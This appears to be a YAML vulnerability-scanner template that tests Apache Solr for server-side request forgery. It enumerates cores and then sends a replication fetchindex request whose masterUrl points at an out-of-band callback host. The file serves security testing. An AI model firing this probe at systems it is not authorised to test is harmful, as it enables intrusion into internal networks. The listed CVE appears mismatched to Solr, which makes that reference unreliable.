id: APACHE_SOLR_SSRF
info:
  name: "Apache Solr Server-Side Request Forgery"
  description: "This vulnerability allows attackers to manipulate the Solr server into sending malicious requests to internal or external systems. By exploiting this flaw, an attacker can potentially access sensitive data or interact with internal services that are not otherwise exposed to the internet, leading to security breaches. This vulnerability often arises from misconfigurations or insufficient input validation in Solr's request handling."
  details:  "The Apache Solr SSRF vulnerability occurs when Solr's internal request handling allows attackers to control certain URLs or parameters that are not properly sanitized. This lets attackers make Solr send crafted HTTP requests to arbitrary servers, bypassing network access controls. It can be triggered through misconfigured components, such as the DataImportHandler or improperly secured API endpoints, and may lead to unauthorized data exposure or further exploitation of internal services."
  impact: "The impact of the Apache Solr SSRF vulnerability can be severe, as it allows attackers to send arbitrary requests from the Solr server to internal systems or external services. This can result in the exposure of sensitive internal resources, bypassing firewall protections, and may be leveraged for additional attacks, such as data exfiltration or further exploitation of vulnerabilities in the internal network. In worst-case scenarios, it can lead to complete system compromise."
  category:
    name: SSRF
    shortName: Server Side Request Forgery
    displayName: Server Side Request Forgery (SSRF)
  subCategory: APACHE_SOLR_SSRF
  severity: MEDIUM
  references:
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa7-server-side-request-forgery.md"
    - "https://www.akto.io/blog/how-to-prevent-server-side-request-forgery-ssrf-as-a-developer"
    - "https://www.cobalt.io/blog/from-ssrf-to-port-scanner"
  cwe:
    - CWE-918
  cve:
    - CVE-2022-22963
api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
  url:
    extract: urlVar
  request_headers:
    for_one:
      key:
        eq: "host"
      value:
        extract: hostHeaderVal

execute:
  type: multiple
  requests:
    - req:
      - modify_url: "/solr/admin/cores"
      - add_query_param: 
          wt: json
      - modify_method: GET
      - replace_body: '{}'
      - validate:
          response_payload:
            for_one:
              key:
                eq: name
              value:
                extract: nameVar
      - success: x2
      - failure: exit
    - req:
      - modify_method: GET
      - modify_url: "/solr/${nameVar}/replication/"
      - send_ssrf_req:
          url: "https://test-services.akto.io/store_uuid/${random_uuid}"
      - add_query_param:
          command: fetchindex
      - add_query_param:
          masterUrl: "https://test-services.akto.io/store_uuid/${random_uuid}"
      - replace_body: '{}'
      - validate:
          response_payload:
            contains_all:
              - "<str name=\"status\">OK</str>"
          ssrf_url_hit: ${random_uuid}
      - success: vulnerable
      - failure: exit